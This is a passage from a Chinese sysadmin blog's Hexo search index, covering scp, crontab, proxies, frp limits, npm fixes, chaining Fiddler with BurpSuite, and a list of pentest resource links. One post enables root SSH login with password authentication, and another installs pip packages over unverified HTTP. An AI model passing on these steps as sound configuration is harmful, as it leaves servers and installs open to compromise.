    <content type="text"><![CDATA[运维中经常需要复制局域网中的文件，linux用scp命令可以快速拷贝局域网中的文件，十分方便，推荐使用！ scp非22端口复制远程文件 linux中scp非22端口复制远程文件 QQ群：397745473 123456789101112131415scp 远程拷贝非22端口的服务器文件的方法:上传文件到服务器scp -P 29966 /Users/ianMac/Desktop/progit.zh.pdf root@远程ssh服务器的ip:/home/wwwroot #大写P下载文件到本地scp -P 29966 root@远程ssh服务器的ip:/home/wwwroot/index.html /Users/ianMac/Desktop/上传本地目录中的所有文件到服务器上scp -P 29966 -r /Users/ianMac/Desktop/.* root@远程ssh服务器的ip:/home/wwwroot/ #-r是将目录下的目录递归拷贝。".*"是将隐藏文件也拷贝过去。下载服务器上目录中的所有文件到本地目录中scp -P 29966 -r root@远程ssh服务器的ip:/home/wwwroot/.* /Users/ianMac/Desktop/ QQ群：397745473]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python过滤特殊字符]]></title>
    <url>%2F2019%2F09%2F30%2F94_python%E8%BF%87%E6%BB%A4%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%2F</url>
    <content type="text"><![CDATA[python过滤特殊字符 QQ群：397745473 python过滤特殊字符 前提背景：通过接口获取到的数据，要存入数据库，由于数据库的编码问题，一些特殊字符出现错误，无法进入数据库 解决办法：过滤掉这些特殊字符，包含emoji表情等各种特殊字符 方法一12345impoer redef filter_str(desstr,restr=&apos;&apos;): #过滤除中英文及数字以外的其他字符 res = re.compile(&quot;[^\u4e00-\u9fa5^a-z^A-Z^0-9]&quot;) return res.sub(restr, desstr) emoji表情库emoji处理库,emoji官网：https://pypi.org/project/emoji/ 12345#安装 pip install emoji# 清除命令emoji.demojize(str) 12345678import redef filter_emoji(desstr,restr=&apos;&apos;): #过滤表情 try: res= re.compile(u&apos;[\U00010000-\U0010ffff]&apos;) except re.error: res = re.compile(u&apos;[\uD800-\uDBFF][\uDC00-\uDFFF]&apos;) return res.sub(restr, desstr) 12345# 打印所有字符for i in range(0x0,0x10ffff): print(chr(i),end=&quot; &quot;) if i%16==15: print() 原贴：https://blog.csdn.net/weixin_43420032/article/details/90314224 QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[frp 报错 too many open files]]></title>
    <url>%2F2019%2F09%2F27%2F92_frp%E6%8A%A5accept4_too_many_open_files%2F</url>
    <content type="text"><![CDATA[frp 报错 too many open files frp报accept4_too_many_open_files QQ群：397745473 问题描述报错： too many open files 参考https://github.com/fatedier/frp/issues/752 解决方法参考：https://www.jianshu.com/p/10ac8e141d76 1234567891011121314151617181920212223242526272829# echo 655350 &gt; /proc/sys/fs/file-max # sysctl -w &quot;fs.file-max=102400&quot;，前面2种重启机器后会恢复为默认值# vim /etc/sysctl.conf, 加入以下内容，重启生效fs.file-max=655350net.nf_conntrack_max = 655350net.netfilter.nf_conntrack_max = 655350# vim /etc/security/limits.conf //加入以下配置，重启即可生效 * hard nofile 655350* soft nofile 655350重启后用ulimit -a确认修改是否成功ulimit -n 655350 或 ulimit -SHn 655350② 在 /etc/profile 中增加一行 ulimit -SHn 655350, 然后运行 source /etc/profile 命令让修改立即生效.—— /etc/profile 文件是所有系统用户的配置文件, 修改后会影响当前系统的所有注册用户. QQ群：397745473]]></content>
      <categories>
        <category>frp</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>frp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python取文件的指定行]]></title>
    <url>%2F2019%2F09%2F27%2F93_python%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E6%8C%87%E5%AE%9A%E8%A1%8C%2F</url>
    <content type="text"><![CDATA[python取文件的指定行 QQ群：397745473 一堆文件,想把这些文件的第2行全部弄出来，用python实现就很方便了 代码如下： 123456789101112# coding:utf-8import osimport globimport linecachePATH = '/www/wwwroot/zmy.xd10086.com/zmy/content/chinese/posts'# glob.glob(PATH + os.sep + '*.md') 取指定目录的md文件for file in glob.glob(PATH + os.sep + '*.md'): # 取文件的指定行 text = linecache.getline(file, 2) print(text) Python中的read(),readline(),readlines()区别与用法 参考:https://www.jianshu.com/p/a672f39287c4 QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[外国人的工具库]]></title>
    <url>%2F2019%2F09%2F26%2F90_%E5%A4%96%E5%9B%BD%E4%BA%BA%E7%9A%84%E5%B7%A5%E5%85%B7%E5%BA%93%2F</url>
    <content type="text"><![CDATA[请输入密码,有问题请加QQ群:397745473 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[crontab使用技巧]]></title>
    <url>%2F2019%2F09%2F26%2F91_crontab%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[linux crontab使用技巧 QQ群：397745473 执行命令时加时间1*/1 * * * * root echo 'command....' | xargs echo $(date '+\%Y-\%m-\%d \%H:\%M:\%S') &gt;&gt; "/a.log" 2&gt;&amp;1; 效果： 123[root@abc]# cat a.log2018-11-01 15:09:01 command....2018-11-01 15:10:01 command.... 有环境变量时需要注意在crontab做oracle 日志导出时报错:UDE-00013、UDE-00019 单独使用正常 UDE-00013: Message 13 not found; No message file for product=RDBMS, facility=UDEUDE-00019: You may need to set ORACLE_HOME to your Oracle software directory 在crontab调用的代码中增加$ORACLE_HOME的全局变量 解决办法: 1234export ORACLE_BASE=/u01/oracleexport ORACLE_HOME=$ORACLE_BASE/product/11.2.0/export ORACLE_SID=dbserverexport ORACLE_TERM=xterm crontab 常规使用方法参考:http://leepiao.blog.163.com/blog/static/4850313020163132145513/ 12345678crontab 的格式是分 时 日 月 周 命令*表示每隔最小单位，但是，分必须是明确的定义 因此，设定每小时执行一次的话，只需要指明每小时的哪一分钟执行就可以了 可以用0 * * * * command 来设定每小时的0分钟执行命令 12345678910111213141516171819202122232425262728293031Crontab语法usage: crontab [-u user] file crontab [-u user] [ -e | -l | -r ] (default operation is replace, per 1003.2) -e (edit user&apos;s crontab) -l (list user&apos;s crontab) -r (delete user&apos;s crontab) -i (prompt before deleting user&apos;s crontab) -s (selinux context) 其中，file是命令文件的名字。如果在命令行中指定了这个文件，那么执行crontab命令，则将这个文件拷贝到crontabs目录下；如果在命令行中没有制定这个文件，crontab命令将接受标准输入（键盘）上键入的命令，并将他们也存放在crontab目录下。 Crontab 格式使用crontab -e 添加要执行的命令。添加的命令必须以如下格式： * * * * * /command path 前五个字段可以取整数值，指定何时开始工作，第六个域是字符串，即命令字段，其中包括了crontab调度执行的命令。 各个字段之间用spaces和tabs分割。 前5个字段分别表示： 分钟：0-59 小时：1-23 日期：1-31 月份：1-12 星期：0-6（0表示周日） 一些特殊符号：*： 表示任何时刻,： 表示分割-：表示一个段，如第二端里： 1-5，就表示1到5点/n : 表示每个n的单位执行一次，如第二段里，*/1, 就表示每隔1个小时执行一次命令。也可以写成1-23/1. QQ群：397745473]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记AWS一次错误操作的恢复过程]]></title>
    <url>%2F2019%2F09%2F25%2F89_%E8%AE%B0AWS%E4%B8%80%E6%AC%A1%E9%94%99%E8%AF%AF%E6%93%8D%E4%BD%9C%E7%9A%84%E6%81%A2%E5%A4%8D%E8%BF%87%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[请输入密码,有问题请加QQ群:397745473 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>AWS</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>AWS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[FRP服务器搭建]]></title>
    <url>%2F2019%2F09%2F24%2F88_FRP%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[请输入密码,有问题请加QQ群:397745473 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>frp</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>frp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[简易堡垒机案例]]></title>
    <url>%2F2019%2F09%2F18%2F87_%E7%AE%80%E6%98%93%E5%A0%A1%E5%9E%92%E6%9C%BA%E6%A1%88%E4%BE%8B%2F</url>
    <content type="text"><![CDATA[简易堡垒机案例 QQ群：397745473 参考： https://github.com/apache/guacamole-serverhttps://www.tecmint.com/guacamole-access-remote-linux-windows-machines-via-web-browser/ 看到 Glyptodon 想起在主机上安装一个然后就能跳到内多的各种环境中，网上搜了一下还真有这种神操作。 参考上面的网址可以安装配置完成当堡垒机用了。 支持RDP VPN 等各种协议 同类远程虚拟桌面工具： https://kast.gg/download.html 还有个比较我好玩的： GateOne Web SSH环境搭建，支持录相 https://db.vsyour.com/forum.php?mod=viewthread&amp;tid=1102 https://www.tecmint.com/ 这里的文章还不错。可以学习学习 QQ群：397745473]]></content>
      <categories>
        <category>运维</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>运维</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux或windows终端走socket代理]]></title>
    <url>%2F2019%2F09%2F09%2F86_linux%E6%88%96windows%E7%BB%88%E7%AB%AF%E8%B5%B0socket%E4%BB%A3%E7%90%86%2F</url>
    <content type="text"><![CDATA[linux或windows终端走socket代理 QQ群：397745473 linux 终端配置socket代理方法1：在终端中直接运行命令如: 1export http_proxy=http://proxyAddress:port 这个办法的好处是简单直接，并且影响面很小（只对当前终端有效，退出就不行了）。如果你用的是ss代理，在当前终端运行以下命令，那么wget curl 这类网络命令都会经过ss代理 1export ALL_PROXY=socks5://127.0.0.1:1080 方法2: 把代理服务器地址写入shell配置文件.bashrc或者.zshrc 直接在.bashrc或者.zshrc添加下面内容 12export http_proxy="http://localhost:port"export https_proxy="http://localhost:port" 以使用shadowsocks代理为例，ss的代理端口为1080,那么应该设置为 12export http_proxy="socks5://127.0.0.1:1080"export https_proxy="socks5://127.0.0.1:1080" 或者直接设置ALL_PROXY 1export ALL_PROXY=socks5://127.0.0.1:1080 localhost就是一个域名，域名默认指向 127.0.0.1，两者是一样的。 然后ESC后:wq保存文件，接着在终端中执行 source ~/.bashrc 或者退出当前终端再起一个终端。 这个办法的好处是把代理服务器永久保存了，下次就可以直接用了。 或者通过设置alias简写来简化操作，每次要用的时候输入setproxy，不用了就unsetproxy。 123alias setproxy="export ALL_PROXY=socks5://127.0.0.1:1080"alias unsetproxy="unset ALL_PROXY"alias ip="curl -i http://ip.cn" 方法3:改相应工具的配置，比如apt的配置 1sudo vim /etc/apt/apt.conf 在文件末尾加入下面这行 1Acquire::http::Proxy "http://proxyAddress:port" 保存apt.conf文件即可。关于apt的代理设置可以参考这里 关于git的代理设置看这里:用shadowsocks加速git clone 方法4(推荐): 利用proxychains在终端使用socks5代理： https://blog.fazero.me/2015/08/31/%E5%88%A9%E7%94%A8proxychains%E5%9C%A8%E7%BB%88%E7%AB%AF%E4%BD%BF%E7%94%A8socks5%E4%BB%A3%E7%90%86/ 补充：如果代理服务器需要登陆，这时可以直接把用户名和密码写进去 1http_proxy=http://userName:password@proxyAddress:port 设完查个IP地址看看： 1curl cip.cc 参考： https://blog.fazero.me/2015/09/15/%E8%AE%A9%E7%BB%88%E7%AB%AF%E8%B5%B0%E4%BB%A3%E7%90%86%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/ 让windows的cmd走socket代理参考：https://www.5yun.org/15978.html 1netsh winhttp set proxy proxy-server="socks=192.168.2.114:10808" 1netsh winhttp set proxy proxy-server="socks=192.168.2.114:10808" bypass-list="localhost" 本地玩mpv开源播放器，需要播放一些不存在网站的视频，所以会需要用到代理使视频能够正常播放，win10系统设置代理的语法貌似发生了改变，因为我用以前的方法没起作用；我是通过下面的方法成功设置CMD代理的； 打开CMD窗口，设置一个http代理 如果你是其它代理将http替换成对应的参数即可，如https、socks（没有版本号），范例如下： netsh winhttp set proxy proxy-server=”socks=localhost:9090” bypass-list=”localhost” 这个socks代理我没有测试，不知道可不可行……… 查看当前CMD正在使用的代理： 1netsh winhttp show proxy 清空删除掉CMD代理：1netsh winhttp reset proxy QQ群：397745473]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[解决AWS下可root登陆]]></title>
    <url>%2F2019%2F09%2F04%2F85_AWS%E7%9A%84Ubuntu%E4%BD%BF%E7%94%A8root%E7%99%BB%E9%99%86%2F</url>
    <content type="text"><![CDATA[AWS Ubuntu 下 root 的创建&amp;登录 每次登陆时都提示： 1Please login as the user &quot;ubuntu&quot; rather than the user &quot;root&quot; 必须要用其他用户登陆后再切换成root账号 QQ群：397745473 问题解决参考：https://www.jianshu.com/p/eecce55f77a1 更改/etc/ssh/sshd_config 配置 12345678vim /etc/ssh/sshd_config ::去掉以下两项的注释PermitRootLogin yes PasswordAuthentication yes # 重启服务/etc/init.d/ssh restart QQ群：397745473]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hugo自动化建站]]></title>
    <url>%2F2019%2F09%2F03%2F84_Hugo%E8%87%AA%E5%8A%A8%E5%8C%96%E5%BB%BA%E7%AB%99%2F</url>
    <content type="text"><![CDATA[请输入密码,有问题请加QQ群:397745473 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>Hugo</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>Hugo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[解决配置windows update失败还原更改]]></title>
    <url>%2F2019%2F08%2F30%2F82_%E9%85%8D%E7%BD%AEwindows_update%E5%A4%B1%E8%B4%A5%E8%BF%98%E5%8E%9F%E6%9B%B4%E6%94%B9%2F</url>
    <content type="text"><![CDATA[配置windows update失败还原更改 更新失败了 一直卡在这里. QQ群：397745473 问题描述：更新操作系统 打补丁到最后一个时提示更新失败了，最后一直卡这里。等了一天还没结果。 解决办法：百度查了各种办法解决，安全模式啊等等各种操作无效啊。。 最终解决办法： 重启按F8 进带命令行的安全模式 安全模式下耐心等待还原。安全模式还原只干预系统文件，最多10-20分钟肯定能进入系统的。 之后就是打开控制面板，关闭自动更新，再重启就可以了。 最后还是不行。结果没办法只好重装系统了。。。真的太坑了。。。 QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python3报错信息记录]]></title>
    <url>%2F2019%2F08%2F30%2F83_python3%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[python3报错信息记录 QQ群：397745473 pip安装软件时报错提示信息： 12345678910111213D:\Anaconda3\Scripts&gt;pip install jiebaWARNING: pip is configured with locations that require TLS/SSL, however the ssl module in Python is not available.Collecting jieba WARNING: Retrying (Retry(total=4, connect=None, read=None, redirect=None, status=None)) after connection broken by 'SSLError("Can't connect to HTTPS URL because the SSL module is not available.")': /simple/jieba/ WARNING: Retrying (Retry(total=3, connect=None, read=None, redirect=None, status=None)) after connection broken by 'SSLError("Can't connect to HTTPS URL because the SSL module is not available.")': /simple/jieba/ WARNING: Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'SSLError("Can't connect to HTTPS URL because the SSL module is not available.")': /simple/jieba/ WARNING: Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'SSLError("Can't connect to HTTPS URL because the SSL module is not available.")': /simple/jieba/ WARNING: Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'SSLError("Can't connect to HTTPS URL because the SSL module is not available.")': /simple/jieba/ Could not fetch URL https://pypi.org/simple/jieba/: There was a problem confirming the ssl certificate: HTTPSConnectionPool(host='pypi.org', port=443): Max retries exceeded with url: /simple/jieba/ (Caused by SSLError("Can't connect to HTTPS URL because the SSL module is not available.")) - skipping ERROR: Could not find a version that satisfies the requirement jieba (from versions: none)ERROR: No matching distribution found for jiebaWARNING: pip is configured with locations that require TLS/SSL, however the ssl module in Python is not available.Could not fetch URL https://pypi.org/simple/pip/: There was a problem confirming the ssl certificate: HTTPSConnectionPool(host='pypi.org', port=443): Max retries exceeded with url: /simple/pip/ (Caused by SSLError("Can't connect to HTTPS URL because the SSL module is not available.")) - skipping 解决办法：123pip install jieba -i http://pypi.douban.com/simple/ --trusted-host pypi.douban.com或pip –trusted-host pypi.python.org install jieba QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[将Fiddler与BurpSuite串起来]]></title>
    <url>%2F2019%2F08%2F29%2F79_%E5%B0%86Fiddler%E4%B8%8EBurpSuite%E4%B8%B2%E8%B5%B7%E6%9D%A5%2F</url>
    <content type="text"><![CDATA[将Fiddler与BurpSuite串起来 转载: BurpSuite和Fiddler串联使用解决App测试漏包和速度慢的问题 转自:http://www.code2sec.com/burpsuitehe-fiddlerchuan-lian-shi-yong-jie-jue-appce-shi-lou-bao-he-su-du-man-de-wen-ti.html 修改: 原教程中收不到包的问题 QQ群：397745473 前言没什么技术含量，就是一个小tips，请轻喷，大侠们有什么更好的也欢迎分享讨论。 问题在实际的测试过程中，我一直使用BurpSuite，但是在使用它进行Android App的测试时发现有两种不好的情况： 1.使用了burp的代理后，响应速度明显降低，有的App对响应时间有要求，待到响应包返回后，页面已经显示超时，无法完成测试。2.第二种情况更是糟糕，就是出现抓不到包的情况。在MottonIN的群也有小伙伴反映过相同的情况；官方论坛也有人遇到：http://forum.portswigger.net/thread/1115 解决方案经过反复尝试，找到了如下的解决方法： 手机wifi设置代理 —–&gt;Fiddler —-&gt;BurpSuite —–&gt;互联网（或者测试环境网络） 原理说明肯定有个疑问，只用burp都慢了，双重代理岂不是更慢？ 答案是非也，串联速度会比只用burp快很多，为什么呢？这可能（我不能保证说得是对的，只是自己的猜测）和2个工具的抓包机制有关了。 Fidder 只是http和https的代理而且是用C#写出来的，而BurpSuite是从底层包中解析http流量，而且是Java写的，这么一对比，单独使用2者的时候，Fidder比BurpSuite也就很正常。 为啥串联还快呢，当Fidder的流量走BurpSuite的时候，没有流量解析的过程，只是单纯的转发，少了最耗时的步骤。总体而言还是比单独使用BurpSuite的时候快很多。 详细配置1.Fidder和BurpSuite的配置 监听8888端口，手机上的代理地址就设置这个 如果要抓https的包，就要如下配置。 (原配置) 发现杂包比较多 修改后: gateway的配置，设置的内容是burpsuite的代理地址，表示流量经过Fiddler后，转发到Burp的代理地址 注意上面的配置是与原教程唯一不同的地方 BurpSuite 配置收收端口对应上就可以了 2.手机上的配置： 设置代理地址；安装Fiddler的证书。 类似案例比如，sql注入的时候想要看到sqlmap使用了哪些payload，就可以使用proxy参数。 注意： Fiddler 默认是不会使用系统hosts 的，而Burpsuite默认是会使用的，所以呢，串联后是会使用的。如果你的测试需要绑定hosts，请注意。 QQ群：397745473]]></content>
      <categories>
        <category>小技巧</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>BurpSuite</tag>
        <tag>Fiddler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo修改记录]]></title>
    <url>%2F2019%2F08%2F29%2F80_Hexo%E4%BF%AE%E6%94%B9%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[Hexo修改记录 记录所有Hexo修改 QQ群：397745473 Hexo 常用工具 Typora 官网： https://typora.io/ (国内访问有点慢) Typora 是一个简单高效的 Markdown 编辑器 Bitvise 官网： https://www.bitvise.com/ bitvise一个非常好用的ssh软件 Find 用find 查找一些CSS的标签来定位需要改哪里文件内容 123find .|xargs grep -ri &quot;vksec&quot;查找目录下的所有文件中是否含有某个字符串,并且只打印出文件名find .|xargs grep -ri &quot;vksec&quot; -l Hexo 安装参考: https://hexo.io/docs/setup https://hexo.io/zh-cn/docs/ Hexo 加本地搜功能 安装本地搜索插件 hexo-generator-search 12# 安装插件，用于生成博客索引数据（在博客根目录下执行下列命令）：npm install hexo-generator-search --save 安装之后，会在站点目录的 public 文件夹下创建一个 search.xml 文件。 修改站点配置文件 在站点配置文件 _config.yml 中添加如下内容： 123456# Search search: path: ./public/search.xml field: post format: html limit: 10000 path：索引文件的路径，相对于站点根目录 field：搜索范围，默认是 post，还可以选择 page、all，设置成 all 表示搜索所有页面 limit：限制搜索的条目数 主题配置文件 在主题配置文件 _config.yml 中找到如下内容： 1234local_search: enable: true trigger: auto top_n_per_article: 1 确保 enable 设成 true。 top_n_per_article 字段表示在每篇文章中显示的搜索结果数量，设成 -1 会显示每篇文章的所有搜索结果数量。 然后，重新部署网站即可愉快的使用本地搜索功能了。 Hexo 主题修改官网的安装方式 12$ cd hexo$ git clone https://github.com/theme-next/hexo-theme-next themes/next 主题位置:/blog/themes/next tag栏中加入默认的tag12345678910编辑:themes/next/layout/_macro/post.swig找到 “post-footer”这里有个for循环在 &#123;% endfor %&#125; 后面加入：&lt;a href="https://book.xd10086.com/categories/%E9%BB%91%E5%AE%A2/" rel="tag"&gt;# 黑客书籍&lt;/a&gt;生成:cd /blog &amp;&amp; hexo clean &amp;&amp; hexo generate &amp;&amp; hexo deploy 在TAG下面加一张默认图片12345同样需要编辑:themes/next/layout/_macro/post.swig找到 “post-footer”在&lt;/div&gt;与&#123;% endif %&#125;中间加入&lt;img src="https://i.imgur.com/0ivBlsQ.jpg" alt="知识星球"&gt; 如果是文章多还是需要用Hugo生成 参考：Theme - Hugo W3 Simple QQ群：397745473]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[整理常用的网盘资源电子书等]]></title>
    <url>%2F2019%2F08%2F29%2F81_%E7%BD%91%E7%9B%98%E8%B5%84%E6%BA%90%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[资源整理 学习资源 电子书 视频教程整理 渗透测试资源 QQ群：397745473 Web安全攻防：渗透测试实战指南《Web安全攻防：渗透测试实战指南》由浅入深、全面、系统地介绍了当前流行的高危漏洞的攻击手段和防御方法，并力求语言通俗易懂，举例简单明了，便于读者阅读、领会。结合具体案例进行讲解，可以让读者身临其境，快速地了解和掌握主流的漏洞利用技术与渗透测试技巧。 阅读《Web安全攻防：渗透测试实战指南》不要求读者具备渗透测试的相关背景，如有相关经验在理解时会更有帮助。《Web安全攻防：渗透测试实战指南》亦可作为大专院校信息安全学科的教材。 12文件名: 686063 Web安全攻防渗透测试实战指南.pdf链 接: https://pan.baidu.com/s/1Rwi1fLz8OsoiX4hOPd6tDQ 提取码: 4hgd Web安全相关的学习教程视频1链接: https://pan.baidu.com/s/1-pWKzKrdhPH5B9IJzjaSZw 提取码: 291s 几个超牛逼的网站12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364据说这里有一牛0Day (哈哈 我怎么就那么不信呢)https://pentest.com.tr/index.html这几个是真牛逼https://www.t00ls.net/pytools.htmlhttps://www.t00ls.net/navi.htmlhttps://xj.hk/RedTeam资料收集整理https://github.com/jeansgit/RedTeamGithub 安全类Repo收集整理https://www.t00ls.net/viewthread.php?tid=36098白帽子讲Web安全脑图https://github.com/smallpo1nt/-IOS安全测试思维导图https://www.t00ls.net/viewthread.php?tid=35639Needle：iOS的安全性测试框架 http://www.mottoin.com/88741.htmliOS安全系列汇总 http://esoftmobile.com/2014/02/14/ios-security/IOS Application Security http://www.droidsec.cn/ios%E5%AE%89%E5%85%A8%E6%96%B0%E4%B9%A6%E6%8E%A8%E8%8D%90%E3%80%8Aios-application-security%E3%80%8B/iOS内核入门教材 https://papers.put.as/papers/ios/2016/D2-StefanEsser-iOS10KernelHeapRevisited.pdf史上最全移动安全学习资料,包括ios/Android/wp https://mobilesecuritywiki.com/ 分享Github上看到的两个非常全面的安全类思维导图整理 https://github.com/phith0n/Mind-Map https://github.com/SecWiki/sec-chart 超详细渗透测试思维导图 原贴：https://www.t00ls.net/viewthread.php?tid=50822 https://github.com/iSafeBlue/Mind-Map 求甲方安全工作思维导图 https://www.t00ls.net/viewthread.php?tid=44528 网络安全高清思维导图 https://down.51cto.com/data/2335750 网络安全思维导图（全套11张） https://blog.51cto.com/lanxiaomi/1964958 MySQL的手工注入学习 https://github.com/Audi-1/sqli-labs 各种安全相关思维导图整理收集 https://github.com/phith0n/Mind-Map 重大安全事件调查思维导图 https://www.t00ls.net/viewthread.php?tid=37875 渗透测试时的思维导图https://www.t00ls.net/viewthread.php?tid=36651安全思维导图集合https://github.com/SecWiki/sec-chart一张图诠释我是怎么维护黑到手的服务器的https://www.t00ls.net/viewthread.php?tid=33522链接: https://pan.baidu.com/s/1doUqbcQK3zolJ5W5TSbd1A 提取码: 6cuh QQ群：397745473]]></content>
      <categories>
        <category>教程整理</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>教程整理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu npm 依赖 node-gyp 出错]]></title>
    <url>%2F2019%2F08%2F27%2F78_ubuntu%E4%BD%BF%E7%94%A8npm%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95%2F</url>
    <content type="text"><![CDATA[提示信息： Ubuntu npm : 依赖: node-gyp (&gt;= 0.10.9) 但是它将不会被安装 解决方案：安装最新版的 Node.js 和 npm QQ群：397745473 报错信息123456789101112root@_:# apt-get install npm正在读取软件包列表... 完成正在分析软件包的依赖关系树 正在读取状态信息... 完成 有一些软件包无法被安装。如果您用的是 unstable 发行版，这也许是因为系统无法达到您要求的状态造成的。该版本中可能会有一些您需要的软件包尚未被创建或是它们已被从新到(Incoming)目录移出。下列信息可能会对解决问题有所帮助：下列软件包有未满足的依赖关系： npm : 依赖: node-gyp (&gt;= 0.10.9) 但是它将不会被安装E: 无法修正错误，因为您要求某些软件包保持现状，就是它们破坏了软件包间的依赖关系。 提示少 node-gyp 依赖,而安装node-gyp也会报错 123456789101112root@_:# apt-get install node-gyp正在读取软件包列表... 完成正在分析软件包的依赖关系树 正在读取状态信息... 完成 有一些软件包无法被安装。如果您用的是 unstable 发行版，这也许是因为系统无法达到您要求的状态造成的。该版本中可能会有一些您需要的软件包尚未被创建或是它们已被从新到(Incoming)目录移出。下列信息可能会对解决问题有所帮助：下列软件包有未满足的依赖关系： node-gyp : 依赖: nodejs-dev 但是它将不会被安装E: 无法修正错误，因为您要求某些软件包保持现状，就是它们破坏了软件包间的依赖关系 这里再安装 nodejs-dev 同样也会报错 12345678910111213141516171819202122root@_:# apt-get install nodejs-dev正在读取软件包列表... 完成正在分析软件包的依赖关系树 正在读取状态信息... 完成 有一些软件包无法被安装。如果您用的是 unstable 发行版，这也许是因为系统无法达到您要求的状态造成的。该版本中可能会有一些您需要的软件包尚未被创建或是它们已被从新到(Incoming)目录移出。下列信息可能会对解决问题有所帮助：下列软件包有未满足的依赖关系： nodejs-dev : 依赖: libuv1-dev (&gt;= 1.15.0) 但无法安装它E: 无法修正错误，因为您要求某些软件包保持现状，就是它们破坏了软件包间的依赖关系。root@_:# apt-get install libuv1-dev正在读取软件包列表... 完成正在分析软件包的依赖关系树 正在读取状态信息... 完成 没有可用的软件包 libuv1-dev，但是它被其它的软件包引用了。这可能意味着这个缺失的软件包可能已被废弃，或者只能在其他发布源中找到E: 软件包 libuv1-dev 没有可安装候选 问题解决 卸载已安装的Node和npm 1234sudo apt remove npm //卸载npmsudo apt remove node //卸载node cd /usr/local/bin //进入该目录中，若有node或者npm文件，将他删除删除 官网下载最新的node.js https://nodejs.org/en/download/current/ 解压并建立软链接 123tar -xJf node-vx.x.x-linux-x64.tar.xz -C /opt //解压到opt目录下sudo ln -s /opt/node-vx.x.x-linux-x64/bin/node /usr/local/bin/nodesudo ln -s /opt/node-vx.x.x-linux-x64/bin/npm /usr/local/bin/npm 问题解决！ 使用淘宝镜象12sudo npm config set registry https://registry.npm.taobao.org //设置淘宝镜像source ~/.bashrc //使修改立即生效 QQ群：397745473]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows用命令卸载补丁]]></title>
    <url>%2F2019%2F08%2F26%2F77_windows%E7%94%A8%E5%91%BD%E4%BB%A4%E5%8D%B8%E8%BD%BD%E8%A1%A5%E4%B8%81%2F</url>
